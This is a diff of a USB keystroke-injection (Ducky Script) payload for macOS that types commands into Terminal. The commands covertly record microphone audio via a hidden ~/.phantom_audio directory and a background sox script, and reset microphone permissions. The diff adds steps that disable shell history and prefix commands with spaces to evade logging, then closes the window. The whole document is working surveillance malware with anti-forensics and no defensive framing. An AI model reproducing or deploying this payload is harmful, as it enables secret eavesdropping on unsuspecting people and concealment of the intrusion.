@@ -30,22 +30,26 @@ STRING Terminal
 DELAY 1000
 ENTER
 DELAY 500
-STRING screen -dm bash -c "nohup python3 record.py &"
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 1000
+STRING  screen -dm bash -c "nohup python3 record.py &"
 DELAY 200
 ENTER
 DELAY 500
-STRING tccutil reset Microphone com.apple.Terminal
+STRING  tccutil reset Microphone com.apple.Terminal
 DELAY 500
 ENTER
-STRING mkdir -p ~/.phantom_audio && cd ~/.phantom_audio
+STRING  mkdir -p ~/.phantom_audio && cd ~/.phantom_audio
 DELAY 500
 ENTER
 DELAY 500
-STRING echo 'import os\nimport subprocess\nimport datetime\n\nfilename = "Secret audio.mp3"\ncmd = f"sox -d -C 128 -r 44100 \"{filename}\""\nsubprocess.Popen(cmd, shell=True)' > record.py
+STRING  echo 'import os\nimport subprocess\nimport datetime\n\nfilename = "Secret audio.mp3"\ncmd = f"sox -d -C 128 -r 44100 \"{filename}\""\nsubprocess.Popen(cmd, shell=True)' > record.py
 DELAY 1000
 ENTER
 DELAY 500
-STRING nohup python3 record.py &
+STRING  nohup python3 record.py &
 ENTER
 DELAY 250 
-GUI h
+GUI w
